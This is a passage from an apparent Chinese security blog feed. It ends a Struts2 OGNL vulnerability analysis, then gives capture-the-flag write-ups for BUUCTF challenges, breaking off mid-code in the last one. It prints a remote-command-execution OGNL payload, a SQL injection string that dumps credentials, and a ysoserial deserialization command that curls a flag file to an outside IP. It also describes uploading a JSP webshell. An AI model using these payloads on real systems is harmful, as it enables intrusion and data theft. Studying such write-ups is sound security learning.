src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209161709860.png"></li><li>进入到重载函数determineActionURL，执行到最后发现我们payload前半段已经被被执行，actionMapper中的allowDynamicMethodCalls属性已经变为true，继续跟入buildUrl方法<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209161712049.png"></li><li>步过到buildParametersString，步入该函数，可以看到我们传入的url和参数被传入其中<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209161714673.png"></li><li>进入到重载方法中，执行直到166行buildParameterSubstring函数，可以看到我们的payload已经被传入其中<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209161717072.png"></li><li>继续跟入translateAndEncode函数，跟入translateVariable函数，可以发现valueStack出现了<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209161718405.png"><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209161719376.png"></li><li>继续跟入就是translateVariables函数了，OGNL表达式在这里被执行<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209161720361.png"></li></ol><p>payload：</p><pre class="line-numbers language-none"><code class="language-none">?a&#x3D;%24%7B%23_memberAccess%5B&quot;allowStaticMethodAccess&quot;%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%27whoami%27).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println(%27dbapp%3D%27%2Bnew%20java.lang.String(%23d))%2C%23out.close()%7D <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF记录3</title>
      <link href="/posts/560a0a51.html"/>
      <url>/posts/560a0a51.html</url>
      
        <content type="html"><![CDATA[<p>BUU第三份</p><span id="more"></span>        <h2 id="极客大挑战-2020-Roamphp2-Myblog"   >          <a href="#极客大挑战-2020-Roamphp2-Myblog" class="heading-link"><i class="fas fa-link"></i></a><a href="#极客大挑战-2020-Roamphp2-Myblog" class="headerlink" title="[极客大挑战 2020]Roamphp2-Myblog"></a>[极客大挑战 2020]Roamphp2-Myblog</h2>      <p>明显的文件读取，login中能看到登录密码生成逻辑，完全随机，没法直接拿到</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$secret_seed</span> <span class="token operator">=</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">mt_srand</span><span class="token punctuation">(</span><span class="token variable">$secret_seed</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看登录逻辑</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$logined</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string double-quoted-string">"Longlone"</span> <span class="token keyword">and</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token comment">// No one knows my password, including myself</span>        <span class="token variable">$logined</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'status'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$logined</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$logined</span> <span class="token operator">===</span> <span class="token constant boolean">false</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'status'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'status'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;script>alert('username or password not correct!');window.location.href='index.php?page=login';&lt;/script>"</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span>  <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'Files'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'status'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$tmp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'Files'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$tmp_path</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'Files'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$extension</span> <span class="token operator">=</span> <span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$tmp_file</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'extension'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token variable">$allows</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'gif'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'jpeg'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'jpg'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'png'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$extension</span><span class="token punctuation">,</span><span class="token variable">$allows</span><span class="token punctuation">,</span><span class="token constant boolean">true</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'Files'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token function">array_map</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token variable">$ext</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token string single-quoted-string">'image/'</span><span class="token operator">.</span><span class="token variable">$ext</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token variable">$allows</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$upload_name</span> <span class="token operator">=</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">uniqid</span><span class="token punctuation">(</span><span class="token function">microtime</span><span class="token punctuation">(</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'.'</span><span class="token operator">.</span><span class="token variable">$extension</span><span class="token punctuation">;</span>        <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$tmp_path</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"assets/img/upload/"</span><span class="token operator">.</span><span class="token variable">$upload_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;script>alert('Update image -> assets/img/upload/$&#123;upload_name&#125;') &lt;/script>"</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;script>alert('Update illegal! Only allows like \'gif\', \'jpeg\', \'jpg\', \'png\' ') &lt;/script>"</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到密码验证中有一个弱比较，传入password为空直接绕过，然后就是文件上传，逻辑就是只能传图片，但是并没有限制文件内容，那phar或者zip吧内容打包都可以（因为触发还需要index中的include xxx.php，所以文件只能以php结尾），记得拦截包修改一下username和password参数，不然直接退出了</p><pre class="line-numbers language-none"><code class="language-none">flag&#123;fa7bcb65-99a0-4643-93c2-93cacaaf442c&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>        <h2 id="网鼎杯-2020-朱雀组-Think-Java"   >          <a href="#网鼎杯-2020-朱雀组-Think-Java" class="heading-link"><i class="fas fa-link"></i></a><a href="#网鼎杯-2020-朱雀组-Think-Java" class="headerlink" title="[网鼎杯 2020 朱雀组]Think Java"></a>[网鼎杯 2020 朱雀组]Think Java</h2>      <p>嘿嘿做的第一道Java题，记录一下Java应该怎么入手，首先目录扫描，扫出了<code>swagger-ui.html</code>，可以看到这个web页面使用的所有API<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209081837086.png"></p><p>看代码是<code>/common/test/sqlDict</code>这一路径的调用，其中dbName是我们传参内容，跟进其中的SqlDict.getTableData，查看getConnection方法，其中本质是通过jdbc接口进行数据库连接，而jdbc在解析数据库时类似于对URL的解析</p><blockquote><p>JDBC 的 URL 也类似 http 请求中的 URL，也可以使用锚点 # 或者 ? 如：jdbc:mysql://mysqldbserver:3306/myapp#’ union select 2#</p></blockquote><p>也就是#后面的内容会被忽略，但是这部分信息依然会被传递到dbName参数中进行接下来的查询</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209081837304.png"></p><p>那我们就可以直接构造出sql注入的语句</p><pre class="line-numbers language-none"><code class="language-none">dbName&#x3D;myapp#&#39; union select group_concat(name,0x3a,pwd)from user#构造出的语句Select TABLE_COMMENT from INFORMATION_SCHEMA.TABLES Where table_schema &#x3D; &#39;myapp#&#39; union select group_concat(name,0x3a,pwd)from user#后面的不重要<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>拿到用户名和密码<code>admin:admin@Rrrr_ctf_asde</code></p><p>登录成功拿到token，发现是Java序列化后内容</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209081917768.png"></p><p>并且将内容提交到currentAPI中时，也会返回用户信息，yso构造序列化攻击即可</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">&#x2F;Users&#x2F;jlan&#x2F;Library&#x2F;Java&#x2F;JavaVirtualMachines&#x2F;azul-1.8.0_332&#x2F;Contents&#x2F;Home&#x2F;bin&#x2F;java -jar &#x2F;Users&#x2F;jlan&#x2F;Documents&#x2F;Tools&#x2F;ysoserial-all.jar ROME &quot;curl http:&#x2F;&#x2F;182.61.46.138:1000 -d @&#x2F;flag&quot; |base64<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209081932780.png"></p>        <h2 id="GKCTF-2021-babycat"   >          <a href="#GKCTF-2021-babycat" class="heading-link"><i class="fas fa-link"></i></a><a href="#GKCTF-2021-babycat" class="headerlink" title="[GKCTF 2021]babycat"></a>[GKCTF 2021]babycat</h2>      <p>快乐java题，靶机启动真的好慢，上来就是一个nt登录界面，登录不行，注册未开放<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209131744693.png"></p><p>但是点击注册查看源代码发现是注册逻辑被注释，按照注释的逻辑构造payload注册，成功注册并登录<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209131745556.png"></p><p>进入主页发电文件上传需要admin权限，并且在download存在文件泄露，先看web.xml内容，根据内容将class文件依次下载，下面我们主要查看uploadServlet和registerServlet</p><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;!DOCTYPE web-app PUBLIC &quot;-&#x2F;&#x2F;Sun Microsystems, Inc.&#x2F;&#x2F;DTD Web Application 2.3&#x2F;&#x2F;EN&quot; &quot;http:&#x2F;&#x2F;java.sun.com&#x2F;dtd&#x2F;web-app_2_3.dtd&quot; &gt;&lt;web-app&gt;  &lt;servlet&gt;    &lt;servlet-name&gt;register&lt;&#x2F;servlet-name&gt;    &lt;servlet-class&gt;com.web.servlet.registerServlet&lt;&#x2F;servlet-class&gt;  &lt;&#x2F;servlet&gt;  &lt;servlet&gt;    &lt;servlet-name&gt;login&lt;&#x2F;servlet-name&gt;    &lt;servlet-class&gt;com.web.servlet.loginServlet&lt;&#x2F;servlet-class&gt;  &lt;&#x2F;servlet&gt;  &lt;servlet&gt;    &lt;servlet-name&gt;home&lt;&#x2F;servlet-name&gt;    &lt;servlet-class&gt;com.web.servlet.homeServlet&lt;&#x2F;servlet-class&gt;  &lt;&#x2F;servlet&gt;  &lt;servlet&gt;    &lt;servlet-name&gt;upload&lt;&#x2F;servlet-name&gt;    &lt;servlet-class&gt;com.web.servlet.uploadServlet&lt;&#x2F;servlet-class&gt;  &lt;&#x2F;servlet&gt;  &lt;servlet&gt;    &lt;servlet-name&gt;download&lt;&#x2F;servlet-name&gt;    &lt;servlet-class&gt;com.web.servlet.downloadServlet&lt;&#x2F;servlet-class&gt;  &lt;&#x2F;servlet&gt;  &lt;servlet&gt;    &lt;servlet-name&gt;logout&lt;&#x2F;servlet-name&gt;    &lt;servlet-class&gt;com.web.servlet.logoutServlet&lt;&#x2F;servlet-class&gt;  &lt;&#x2F;servlet&gt;  &lt;servlet-mapping&gt;    &lt;servlet-name&gt;logout&lt;&#x2F;servlet-name&gt;    &lt;url-pattern&gt;&#x2F;logout&lt;&#x2F;url-pattern&gt;  &lt;&#x2F;servlet-mapping&gt;  &lt;servlet-mapping&gt;    &lt;servlet-name&gt;download&lt;&#x2F;servlet-name&gt;    &lt;url-pattern&gt;&#x2F;home&#x2F;download&lt;&#x2F;url-pattern&gt;  &lt;&#x2F;servlet-mapping&gt;  &lt;servlet-mapping&gt;    &lt;servlet-name&gt;register&lt;&#x2F;servlet-name&gt;    &lt;url-pattern&gt;&#x2F;register&lt;&#x2F;url-pattern&gt;  &lt;&#x2F;servlet-mapping&gt;  &lt;display-name&gt;java&lt;&#x2F;display-name&gt;  &lt;servlet-mapping&gt;    &lt;servlet-name&gt;login&lt;&#x2F;servlet-name&gt;    &lt;url-pattern&gt;&#x2F;login&lt;&#x2F;url-pattern&gt;  &lt;&#x2F;servlet-mapping&gt;  &lt;servlet-mapping&gt;    &lt;servlet-name&gt;home&lt;&#x2F;servlet-name&gt;    &lt;url-pattern&gt;&#x2F;home&lt;&#x2F;url-pattern&gt;  &lt;&#x2F;servlet-mapping&gt;  &lt;servlet-mapping&gt;    &lt;servlet-name&gt;upload&lt;&#x2F;servlet-name&gt;    &lt;url-pattern&gt;&#x2F;home&#x2F;upload&lt;&#x2F;url-pattern&gt;  &lt;&#x2F;servlet-mapping&gt;  &lt;filter&gt;    &lt;filter-name&gt;loginFilter&lt;&#x2F;filter-name&gt;    &lt;filter-class&gt;com.web.filter.LoginFilter&lt;&#x2F;filter-class&gt;  &lt;&#x2F;filter&gt;  &lt;filter-mapping&gt;    &lt;filter-name&gt;loginFilter&lt;&#x2F;filter-name&gt;    &lt;url-pattern&gt;&#x2F;home&#x2F;*&lt;&#x2F;url-pattern&gt;  &lt;&#x2F;filter-mapping&gt;  &lt;display-name&gt;java&lt;&#x2F;display-name&gt;  &lt;welcome-file-list&gt;    &lt;welcome-file&gt;&#x2F;WEB-INF&#x2F;index.jsp&lt;&#x2F;welcome-file&gt;  &lt;&#x2F;welcome-file-list&gt;&lt;&#x2F;web-app&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>那我们该如何成为admin呢，直接看注册类中的关键代码</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token class-name">StringUtils</span><span class="token punctuation">.</span><span class="token function">isNullOrEmpty</span><span class="token punctuation">(</span>role<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> <span class="token operator">=</span> <span class="token keyword">var</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>role<span class="token punctuation">,</span> <span class="token string">"\"role\":\"guest\""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    person <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Person</span><span class="token punctuation">)</span>gson<span class="token punctuation">.</span><span class="token function">fromJson</span><span class="token punctuation">(</span><span class="token keyword">var</span><span class="token punctuation">,</span> <span class="token class-name">Person</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    person <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Person</span><span class="token punctuation">)</span>gson<span class="token punctuation">.</span><span class="token function">fromJson</span><span class="token punctuation">(</span><span class="token keyword">var</span><span class="token punctuation">,</span> <span class="token class-name">Person</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    person<span class="token punctuation">.</span><span class="token function">setRole</span><span class="token punctuation">(</span><span class="token string">"guest"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此处对我们传入的data注册信息进行了处理，将role的json内容换成了guest，也就是说我们直接更改data中的role属性是行不通的，这里我们可以使用unicode字符绕过，并且在属性中多添加一层内容使其中包含了role属性来确保我们能够进入第一个判断，构造出的payload如下</p><pre class="line-numbers language-none"><code class="language-none"><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注册成功并且成功进入文件上传界面<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209131804530.png"> </p><p>传一个jsp马到static目录下连接即可</p><p>但是似乎buu的这个版本是修复后的，对文件内容进行了过滤，没法传🐎，我有什么办法（</p>        <h2 id="HarekazeCTF2019-Sqlite-Voting"   >          <a href="#HarekazeCTF2019-Sqlite-Voting" class="heading-link"><i class="fas fa-link"></i></a><a href="#HarekazeCTF2019-Sqlite-Voting" class="headerlink" title="[HarekazeCTF2019]Sqlite Voting"></a>[HarekazeCTF2019]Sqlite Voting</h2>      <p>源码全是过滤</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'source'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token variable">$banword</span> <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token comment">// dangerous chars</span>    <span class="token comment">// " % ' * + / &lt; = > \ _ ` ~ -</span>    <span class="token string double-quoted-string">"[\"%'*+\\/&lt;=>\\\\_`~-]"</span><span class="token punctuation">,</span>    <span class="token comment">// whitespace chars</span>    <span class="token string single-quoted-string">'\s'</span><span class="token punctuation">,</span>    <span class="token comment">// dangerous functions</span>    <span class="token string single-quoted-string">'blob'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'load_extension'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'char'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'unicode'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'(in|sub)str'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'[lr]trim'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'like'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'glob'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'match'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'regexp'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'in'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'limit'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'order'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'union'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'join'</span>  <span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token variable">$regexp</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'|'</span><span class="token punctuation">,</span> <span class="token variable">$banword</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/i'</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$regexp</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-Type: text/json; charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// check user input</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'error'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'You must specify vote id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'error'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'Vote id contains dangerous chars'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// update database</span><span class="token variable">$pdo</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PDO</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'sqlite:../db/vote.db'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$pdo</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"UPDATE vote SET count = count + 1 WHERE id = $&#123;id&#125;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$res</span> <span class="token operator">===</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'error'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'An error occurred while updating database'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// succeeded!</span><span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token punctuation">[</span>  <span class="token string single-quoted-string">'message'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'Thank you for your vote! The result will be published after the CTF finished.'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" 